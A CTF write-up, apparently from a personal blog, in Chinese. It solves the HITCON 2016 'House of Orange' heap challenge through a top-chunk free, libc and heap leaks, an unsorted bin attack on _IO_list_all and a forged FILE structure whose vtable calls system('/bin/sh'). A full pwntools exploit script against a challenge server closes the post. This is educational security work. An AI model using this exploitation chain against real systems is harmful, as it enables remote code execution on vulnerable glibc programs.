---
title: Houseoforange Hitcon2016
date: 2023-01-02 19:54:26
categories: 
- pwn_wp
tags: 
- pwn
- heap
- house_of_xxx

---

这题似乎是house of orange的起源，堆题经典保护全开，也是经典的菜单。
<!-- more -->

这题似乎是house of orange的起源，堆题经典保护全开，也是经典的菜单。

不过只有增查改，没有删除功能，最多只能申请4个chunk，size<=0x1000。

结构体house:

```c
struct house{
    unsigned int price;
    int color; //56746 or 31~37
    char* name;
}
```

其中的price和color的0x8字节是用calloc申请的。

在see house的功能中，如果color为56746，那么只会从0x202080+一个随机数处输出一段字符串，不会输出color。那一段字符串只是不同表情的橙子。

```c
  if ( *(_DWORD *)(*new_house + 4LL) == 56746 )
  {
    printf("Name of house : %s\n", (const char *)new_house[1]);
    printf("Price of orange : %d\n", *(unsigned int *)*new_house);
    v0 = rand();
    return printf("\x1B[01;38;5;214m%s\x1B[0m\n", *((const char **)&unk_203080 + v0 % 8));
  }
```

upgrade功能只能调用3次，在upgrade中没有比较两次的size，因此在输入name的时候存在堆溢出。

再仔细看可以发现，在输入name的时候使用的是read，没有在末尾加上`'\x00'`，因此有泄露信息的机会。

```c
    printf("Length of name :");
    size = get_num();                             // 没有和原来的size比较
    if ( size > 0x1000 )
      size = 4096;
    printf("Name:");
    read_buf((void *)new_house[1], size);         // 存在堆溢出
```

但是程序并没有free，要free的话只能利用house of orange。

里面每次的see、upgrade功能均只会对最新build的house进行操作。每次build了一个house之后，new_house就被赋值为新创建的house。

这道题的总体思路：

`House of Orange leak libc -> unsorted bin attack 劫持 _IO_list_all -> FSOP -> 走malloc出现错误到_IO_OVERFLOW `

## leak libc

因为build的功能中对name而言，并没有清除原有的信息，因此free后再malloc可以泄露bin中关于libc和heapbase的信息。我们可以通过house of orange将old top chunk释放到unsorted bin。

house of orange关键在于要合理伪造新的top chunk size绕过检测，检测如下：

```c
  assert ((old_top == initial_top (av) && old_size == 0) ||
          ((unsigned long) (old_size) >= MINSIZE && //old size>=MINSIZE==0x20
           prev_inuse (old_top) && //old top chunk's prev_inuse==1 最低位为1
           ((unsigned long) old_end & (pagesize - 1)) == 0)); 
//old_top_chunk_addr+old_size-1==n*0x1000 页地址要对齐，old top chunk后面要是新的一页
```

之后再通过malloc从中切割出新的chunk用来存放name，这个chunk最好是**large bin chunk，这样chunk中的fd和bk指针可以用来泄露libc，fd_nextsize和bk_nextsize则可以用来泄露heapbase**，一次是泄露不完的，可以修改两次分别泄露两个信息。

```c
//从old top chunk中切割出来的chunk
0x5647bb6470d0:	0x0000000000000000	0x0000000000000611
0x5647bb6470e0:	0x6464646463636363	0x00007f625ca78188
0x5647bb6470f0:	0x00005647bb6470d0	0x00005647bb6470d0
```

而old top chunk中余下的部分就有回到了unsorted bin中。

## FSOP

当malloc出现错误的时候，会调用一系列函数，其调用链为：

`malloc() -> malloc_printerr() -> __libc_message() -> abort() -> fflush() -> _IO_flush_all_lockp()`

而`_IO_flush_all_lockp()`会从`_IO_list_all`开始遍历链表，对所有的IO_FILE逐一进行检查，如果检查通过，那么`_IO_OVERFLOW`会从虚表中调用`_IO_new_file_overflow()`。如果我们能**劫持虚表的`_IO_new_file_overflow()`**，那么就能通过malloc的异常get shell。

在leak完成之后，我们得到了libcbase和heapbase，但也只剩下1次build和1次upgrade了，进行FSOP需要我们能劫持文件流，并触发对应的函数，因此在upgrade中就要构造好文件流，之后在最后一次build中触发。

1次堆溢出可以让我们控制unsorted bin中的留下的free chunk。劫持文件流首先就要控制`_IO_list_all`，我们可以通过堆溢出控制unsorted bin chunk的bk指针，利用unsorted bin attack将unsorted bin头写到`_IO_list_all`中，这样`_IO_list_all`就不再指向`_IO_2_1_stderr`而是指向**unsorted bin头**。

之后我本以为可以在unsorted bin处伪造`_IO_2_1_stderr`，但实际上是不行的。写入后的`_IO_list_all`直接指向**unsorted bin头，而不是unsorted bin**，因此其后面的字段是其他的bin头，而不是unsorted bin中的内容。因此不能直接伪造`_IO_2_1_stderr`，但是IO_FILE通过`_chain`字段形成链表，我们可以控制`_chain`来伪造`_IO_2_1_stdout`

```c
pwndbg> p *(struct _IO_FILE_plus*)0x7f887ea5bb78
$2 = {
  file = {
    _flags = -1188204592,
    _IO_read_ptr = 0x5565b92b5700 "",
    _IO_read_end = 0x5565b92b5700 "",
    _IO_read_base = 0x5565b92b5700 "",
    _IO_write_base = 0x7f887ea5bb88 <main_arena+104> "",
    _IO_write_ptr = 0x7f887ea5bb88 <main_arena+104> "",
    _IO_write_end = 0x7f887ea5bb98 <main_arena+120> "\210\273\245~\210\177",
    _IO_buf_base = 0x7f887ea5bb98 <main_arena+120> "\210\273\245~\210\177",
    _IO_buf_end = 0x7f887ea5bba8 <main_arena+136> "\230\273\245~\210\177",
    _IO_save_base = 0x7f887ea5bba8 <main_arena+136> "\230\273\245~\210\177",
    _IO_backup_base = 0x7f887ea5bbb8 <main_arena+152> "\250\273\245~\210\177",
    _IO_save_end = 0x7f887ea5bbb8 <main_arena+152> "\250\273\245~\210\177",
    _markers = 0x7f887ea5bbc8 <main_arena+168>,
    _chain = 0x7f887ea5bbc8 <main_arena+168>,
    _fileno = 2124790744,
    _flags2 = 32648,
    _old_offset = 140224217070552,
    _cur_column = 48104,
    _vtable_offset = -91 '\245',
    _shortbuf = "~",
    _lock = 0x7f887ea5bbe8 <main_arena+200>,
    _offset = 140224217070584,
    _codecvt = 0x7f887ea5bbf8 <main_arena+216>,
    _wide_data = 0x7f887ea5bc08 <main_arena+232>,
    _freeres_list = 0x7f887ea5bc08 <main_arena+232>,
    _freeres_buf = 0x7f887ea5bc18 <main_arena+248>,
    __pad5 = 140224217070616,
    _mode = 2124790824,
    _unused2 = "\210\177\000\000(\274\245~\210\177\000\000\070\274\245~\210\177\000"
  },
  vtable = 0x7f887ea5bc38 <main_arena+280>
}
```

可以看到，在`_IO_list_all`被修改后，`_chain`字段对应的是`main_arena+168`，在bin中对应的就是size为0x60的small bin，因此如果能在small bins[4]的位置放入一个chunk，那么`_chain`字段就会指向该chunk，将该chunk当作是`_IO_2_1_stdout`，我们在该chunk中伪造stdout即可。

而要放入small bins[4]也不困难，我们将unsorted bin chunk的size修改为0x61，后面build时malloc的第1个chunk的大小一定是0x21，不满足条件，这个unsorted bin中的chunk一定会被放入small bins[4]中，这样通过`_chain`找到该chunk。fake file的构造如下：

```py
# construct fake _IO_2_1_stdout
fakefile="/bin/sh\x00"+p64(0x61)+p64(0)+p64(IO_list_all-0x10) # reset bk 
fakefile+=p64(0)+p64(1) # write_base < write_ptr
fakefile=fakefile.ljust(0xd8,'\x00')
fakefile+=p64(heapbase+0x700+0xf0-0x18) # vtable, make _IO_overflow_t <vtable+3*0x8>==sys_addr
fakefile+=p64(0)*2
fakefile+=p64(sys_addr)
```

之后就在该chunk中构造`_IO_2_1_stdout`以及vtable即可，只要偏移算对就没什么问题了。最后伪造chunk头为"/bin/sh\x00"，伪造`_IO_overflow_t`为system，在对该fake file调用`_IO_new_file_overflow()`时即可调用`system("/bin/sh\x00")`get shell。

最终exp:（只能打通本地，打不通buu，应该是libc不对）

```python
from pwn import*
context(log_level='debug',os='linux',arch='amd64')
filename='orange'
elf=ELF('./'+filename)
libc=ELF('./2.23-0ubuntu11.3_amd64/libc-2.23.so')
# p=process('./'+filename)
p=remote('node4.buuoj.cn',27360)

s       = lambda data               :p.send(data)
sl      = lambda data               :p.sendline(data)
r       = lambda num=4096           :p.recv(num)
rl      = lambda num=4096           :p.recvline(num)
ru      = lambda x                  :p.recvuntil(x)
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4,'\x00'))
uu64    = lambda data               :u64(data.ljust(8,'\x00'))
leak    = lambda name,addr          :log.success('{} = {}'.format(name, addr))

def debug(cmd='\n'):
  gdb.attach(p,cmd)
  pause()


def add(size,name,price,color):
  ru("Your choice : ")
  sl('1')
  ru("Length of name :")
  sl(str(size))
  ru("Name :")
  s(str(name))
  ru("Price of Orange:")
  sl(str(price))
  ru("Color of Orange:")
  sl(str(color))

def see():
  ru("Your choice : ")
  sl('2')

def upgrade(size,name,price,color):
  ru("Your choice : ")
  sl('3')
  ru("Length of name :")
  sl(str(size))
  ru("Name:")
  s(str(name))
  ru("Price of Orange: ")
  sl(str(price))
  ru("Color of Orange: ")
  sl(str(color))


add(0x20,'aaaa',1,56746)
payload='a'*0x20+p64(0)+p64(0x21)+p32(0xddaa)+p32(0x1)+p64(0) # padding + calloc(0x8)
payload+=p64(0)+p64(0xf91) # top chunk size == 0xf91
upgrade(0x50,payload,1,56746) 
# debug()
add(0xfc0,'aaaabbbb',1,56746) # house of orange free top chunk
# debug()
add(0x600,'ccccdddd',1,56746) # cut a large bin chunk from old top chunk

# leak libc and heap address by bk and fd_nextsize
see()
ru("Name of house : ")
ru("ccccdddd")
libcbase=uu64(ru('\n')[:-1]) -0x610 -88 -0x10 -libc.sym['__malloc_hook']
leak("libcbase",hex(libcbase))
# debug()
upgrade(0x10,'f'*0x10,1,56746)
see()
ru("Name of house : ")
ru('f'*0x10)
heapbase=uu64(ru('\n')[:-1])-0xd0

leak("libcbase",hex(libcbase))
leak("heapbase",hex(heapbase))

# debug()

# FSOP
IO_list_all=libcbase+libc.sym['_IO_list_all']
leak("IO_list_all",hex(IO_list_all))
sys_addr=libcbase+libc.sym['system']

# debug()

payload='a'*0x600+p64(0)+p64(0x21)+p64(0x0000ddaa00000001)+p64(0) # before unsorted bin
fakefile="/bin/sh\x00"+p64(0x61)+p64(0)+p64(IO_list_all-0x10) # reset bk and construct fake _IO_2_1_stdout
# construct fake _IO_2_1_stdout
fakefile+=p64(0)+p64(1) # write_base < write_ptr
fakefile=fakefile.ljust(0xd8,'\x00')
fakefile+=p64(heapbase+0x700+0xf0-0x18) # vtable
fakefile+=p64(0)*2
fakefile+=p64(sys_addr)
payload+=fakefile
leak("system",hex(IO_list_all))
upgrade(0x600+len(payload),payload,1,56746)

# debug()
# trigger by add
ru("Your choice : ")
sl('1')

itr()
```

